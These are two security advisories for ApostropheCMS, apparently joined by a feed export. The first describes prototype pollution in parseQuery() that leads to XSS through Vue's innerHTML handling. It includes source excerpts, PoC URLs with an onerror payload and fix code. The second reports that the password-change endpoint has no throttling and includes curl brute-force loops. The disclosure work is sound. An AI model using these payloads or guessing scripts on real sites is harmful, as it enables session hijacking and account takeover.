  • Affected versions: all 4.x releases, 4.0.0 through 4.32.2 (current latest). Verified by inspecting the published npm tarballs: apostrophe@4.0.0 already contains the vulnerable descent (parentKey = 'root') with no __proto__/constructor/prototype filtering, and apostrophe@4.32.2 is unchanged in this respect. The vulnerable parseQuery() logic was introduced in commit 0255086bf (2020-11-12), well before the 4.0 version, so ApostropheCMS 3.x is also affected (the same code ships in 3.x at the older build path modules/@apostrophecms/util/ui/public/2-http.js).
  • Patched versions: none at time of writing.

Details

The issue has three parts. Parts 1 and 2 are ApostropheCMS code and constitute the reportable vulnerability. Part 3 is the escalation gadget, which is standard Vue behavior and is included for completeness.

1. The pollution primitive: source (ApostropheCMS)

modules/@apostrophecms/util/ui/src/http.js, function apos.http.parseQuery() (line ~301) and its inner patch() (lines ~317–354):

function patch(key, value) {
  let match;
  let parentKey = 'root';
  let context = data;                    // data = {}  (ordinary object)
  key = decodeURIComponent(key);
  const path = key.split('[');
  path.forEach(function(subKey) {
    if (subKey === ']') {
      /* array handling */
    } else if (subKey.match(/^\d+]/)) {
      /* numeric index handling */
    } else {
      match = subKey.replace(']', '');
      if (!context[parentKey]) {         // (A) truthy check, not an own-property check
        context[parentKey] = {};
      }
      context = context[parentKey];      // (B) descends into whatever this resolves to
      parentKey = match;
    }
  });
  value = (value === null) ? value : decodeURIComponent(value);
  if (Array.isArray(context[parentKey])) {
    context[parentKey].push(value);
  } else if (context[parentKey] !== undefined) {
    context[parentKey] = [ context[parentKey], value ];
  } else {
    context[parentKey] = value;          // (C) assignment onto the resolved object
  }
}

No __proto__, constructor, or prototype key is rejected. Walking the input __proto__[x]=v:

  1. Segment __proto__: at (A), context['__proto__'] resolves to the object's inherited prototype (truthy), so the {} initializer is skipped; at (B), context becomes Object.prototype.
  2. Segment x: at (C), Object.prototype['x'] = v.

The truthy guard at (A) (rather than an own-property check) is what allows the descent into the inherited prototype. Because the assignment at (C) is an ordinary property write, the resulting Object.prototype property is enumerable,which matters for the gadget (3).

2. The trigger: reached on every authenticated page load (ApostropheCMS)

modules/@apostrophecms/admin-bar/ui/apos/components/TheAposContextBar.vue. The component's data() initializer (line ~64) runs when the admin context bar mounts (i.e. on every authenticated page load), and passes the raw query string straight into the vulnerable parser:

data() {
  const query = apos.http.parseQuery(location.search);   // <- attacker-controlled -> (1) pollution, on mount
  const draftMode = query.aposMode || 'published';
  // ...
}

The same component's refresh() method (line ~606) passes window.location.search into parseQuery() again on admin-bar refresh events, and folds it into doc._url (re-parsed inside apos.http.remote()), providing additional trigger points.

The admin context bar mounts only when a session is present and the admin bundle loads, so none of this executes for anonymous visitors, which is why the pollution is observed only when logged in. All of this is core ApostropheCMS code (node_modules/apostrophe/...); it is not introduced by any project or starter kit content.

3. The escalation gadget: Vue element mount (framework behavior; known, not novel)

The demonstrated payload pollutes the property innerHTML (__proto__[innerHTML]=<img/src/onerror=alert(1)>). The sink that consumes it is Vue's standard element-mount path, not ApostropheCMS code. Confirmed in the bundled framework (vue / @vue/runtime-core / @vue/runtime-dom all 3.5.42):

@vue/runtime-core mountElement, prop enumeration (line ~5741):

if (props) {
  for (const key in props) {                              // for...in walks the prototype chain
    if (key !== "value" && !shared.isReservedProp(key)) { // isReservedProp does NOT list innerHTML
      hostPatchProp(el, key, null, props[key], ...);      // props["innerHTML"] → inherited polluted value
    }
  }

@vue/runtime-dom patchDOMProp (line ~583), reached via hostPatchProp:

function patchDOMProp(el, key, value, ...) {
  if (key === "innerHTML" || key === "textContent") {
    if (value != null) {
      el[key] = key === "innerHTML" ? unsafeToTrustedHTML(value) : value;  // el.innerHTML = payload
    }
    return;
  }

Mechanism: whenever Vue mounts an element that has a non-null props object without its own innerHTML (routine during the admin render), for (const key in props) enumerates the inherited, enumerable innerHTML from Object.prototype; it passes the "value" and isReservedProp filters; props["innerHTML"] resolves to the attacker's payload; and patchDOMProp writes it to el.innerHTML. unsafeToTrustedHTML is Vue's Trusted-Types wrapper, not a sanitizer, a passthrough unless Trusted Types is enforced (not the default).

This gadget is a well-documented, essentially universal client-side-PP > XSS escalation in Vue applications. It is not claimed as a novel finding and is not ApostropheCMS's to fix, it cannot be removed without changing Vue. Its relevance here is that it makes the (1) pollution reliably exploitable in any ApostropheCMS admin session.

Proof of Concept

Prerequisite: a running ApostropheCMS instance and any authenticated session (a guest account suffices). The tester/victim must be logged in.

A. Prototype pollution (console-verifiable):

  1. Log in as any user.
  2. Navigate to: https://TARGET/?__proto__[prop]=polluted
  3. In the browser console: Object.prototype.prop > returns "polluted".

B. DOM-based XSS:

  1. Log in as any user.
  2. Navigate to: https://TARGET/?__proto__[innerHTML]=%3Cimg/src/onerror%3dalert(1)%3E
  3. alert(1) executes in the victim's authenticated origin.

To capture the sink stack for evidence: DevTools > Sources > open the admin bundle > pretty-print > search unsafeToTrustedHTML (or === "innerHTML") > line breakpoint in the patchDOMProp innerHTML branch > reload the logged-in payload URL > inspect value and walk the call stack up through hostPatchProp to mountElement's for…in.

Both A and B were reproduced against ApostropheCMS 4.32.2 (Vue 3.5.42) in Chrome, Firefox, and Edge browsers.

Impact

Any party who can coerce an authenticated ApostropheCMS user to open a crafted URL can execute arbitrary JavaScript in that user's session. Because the escalation gadget is a guaranteed-present Vue behavior, this is a reliable exploit, not a theoretical primitive. Consequences scale with the victim's role:

  • Any authenticated victim: actions and data reads available to that account; theft of the session cookie / CSRF token from the authenticated context.
  • Editor/admin victim: the injected script can invoke the authenticated management REST APIs as the victim, creating or modifying documents and user accounts, changing configuration and possibly leading to account takeover and potential full compromise of the CMS instance.

Prototype pollution can additionally affect unrelated code paths that read inherited properties, so other gadgets beyond the demonstrated Vue innerHTML sink may exist.

Remediation

The fix belongs in ApostropheCMS, at the source (1). The gadget (3) is framework behavior and cannot be relied upon to change, so sanitizing parseQuery is the correct fix.

Primary fix: reject prototype-affecting keys in parseQuery/patch():

apos.http.parseQuery = function(query) {
  query = query.replace(/^\?/, '');
  const data = {};
  const DANGEROUS = new Set([ '__proto__', 'constructor', 'prototype' ]);
  query.split('&').forEach(function(pair) {
    // ... unchanged ...
  });
  return data.root || {};

  function patch(key, value) {
    let match;
    let parentKey = 'root';
    let context = data;
    key = decodeURIComponent(key);
    const path = key.split('[');
    let dangerous = false;
    path.forEach(function(subKey) {
      const cleanKey = subKey.replace(']', '');
      if (DANGEROUS.has(cleanKey)) {   // refuse to traverse into prototype-affecting keys
        dangerous = true;
        return;
      }
      // ... existing subKey handling ...
    });
    if (dangerous) {
      return;                          // discard this parameter entirely
    }
    // ... existing assignment ...
  }
};

Defense in depth:

  • Replace the truthy guard at (A) with an own-property check: if (!Object.prototype.hasOwnProperty.call(context, parentKey)), so a key can never descend into an inherited prototype.
  • Build data and any created containers with Object.create(null) so intermediate objects have no prototype chain to reach.

Interim mitigation for operators: restrict who holds authenticated accounts, and be aware that opening untrusted links while logged in can trigger this. There is no server-side configuration toggle that disables the vulnerable client behavior.

References

  • Source (ApostropheCMS): apostrophe/modules/@apostrophecms/util/ui/src/http.js — parseQuery() / patch()
  • Trigger (ApostropheCMS): apostrophe/modules/@apostrophecms/admin-bar/ui/apos/components/TheAposContextBar.vue — data() (line 64), refresh() (line 606)
  • Escalation gadget (Vue 3.5.42, framework behavior): @vue/runtime-core mountElement prop enumeration (line 5741); @vue/runtime-dom patchDOMProp innerHTML branch (line 583)
  • Related but distinct: CVE-2026-53609 / GHSA-6h5j-32cf-4253 (server-side prototype pollution via apos.util.set() / $pullAll, fixed in 4.31.0)
  • CWE-1321; CWE-79

items.content_html:
Summary The self-service password-change endpoint verifies the current password but does not use the login module’s failed-attempt counter, throttle, delay, or lockout mechanism. An attacker with a valid authenticated session can submit repeated guesses for the current password without receiving a lockout or throttle response.

Exact source path packages/apostrophe/modules/@apostrophecms/settings/index.js:621-664

The password-change route is: PATCH /api/v1/@apostrophecms/settings/password

The route calls the password verifier directly through: await self.handleProtectedSubform(req, subform, req.body );

The password verification path is: packages/apostrophe/modules/@apostrophecms/settings/index.js:514-542

async handlePasswordProtectedSubform(req, subform, payload) { try { await self.apos.user.verifyPassword(req.user, payload.passwordCurrent); } catch (e) { throw self.apos.error( 'forbidden', 'apostrophe:passwordCurrentError', { path: 'passwordCurrent' } ); } return subform; }

The verifier itself does not increment the login-attempt cache or enforce a delay: packages/apostrophe/modules/@apostrophecms/user/index.js:412-487

By contrast, the login route explicitly calls checkLoginAttempts and addLoginAttempt in: packages/apostrophe/modules/@apostrophecms/login/index.js:831-929

Local PoC The test used a disposable authenticated guest session against:

Request:

PATCH /api/v1/@apostrophecms/settings/password HTTP/1.1
Host: 127.0.0.1:3000
Cookie: <redacted-authenticated-session>
Content-Type: application/json

{
  "password": "new-temporary-password",
  "passwordRepeat": "new-temporary-password",
  "passwordCurrent": "definitely-wrong-current-password"
}

Equivalent command:

for i in 1 2 3 4 5; do
  time curl -i -sS \
    -b /path/to/temporary-session-cookie-jar.txt \
    -X PATCH \
    'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password' \
    -H 'Content-Type: application/json' \
    --data-raw '{
      "password": "new-temporary-password",
      "passwordRepeat": "new-temporary-password",
      "passwordCurrent": "definitely-wrong-current-password"
    }'
done

Observed response All five attempts returned the same immediate validation response: HTTP/1.1 403 Forbidden Content-Type: application/json; charset=utf-8 { "name": "forbidden", "data": { "path": "passwordCurrent" }, "message": "apostrophe:passwordCurrentError" }

Observed timings were approximately: Attempt 1: 231 ms Attempt 2: 232 ms Attempt 3: 226 ms Attempt 4: 229 ms Attempt 5: 226 ms

No attempt returned a throttle response, lockout message, Retry-After header, or rate-limit status.

seq 1 20 | xargs -P 20 -I{} sh -c
"curl --max-time 15 -sS
-o /tmp/password-attempt-{}.body
-w '%{http_code}\n'
-b /path/to/temporary-session-cookie-jar.txt
-X PATCH
'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password'
-H 'Content-Type: application/json'
--data-raw '{"password":"new-temporary-password-{}","passwordRepeat":"new-temporary-password-{}","passwordCurrent":"wrong-current-{}"}'"

Result: 20 requests -> HTTP 403 Forbidden 0 requests -> HTTP 429 Too Many Requests 0 requests -> lockout response

The valid password continued to authenticate afterward: POST /api/v1/@apostrophecms/login/login HTTP/1.1 HTTP/1.1 200 OK

Impact An attacker who has obtained or hijacked a valid authenticated session can repeatedly guess the current password through the password-change endpoint. Each guess receives a normal response, and the route does not apply the login throttle or lockout mechanism. If the current password is weak or reused, this can allow the attacker to pass the current-password check and replace the account password. The attacker would then be able to log in after the password change. The attack requires a valid authenticated session and does not work anonymously. Severity Medium, subject to the application’s session-threat model. The prerequisite of an already authenticated session limits exploitability, but successful guessing leads directly to account takeover through password replacement.
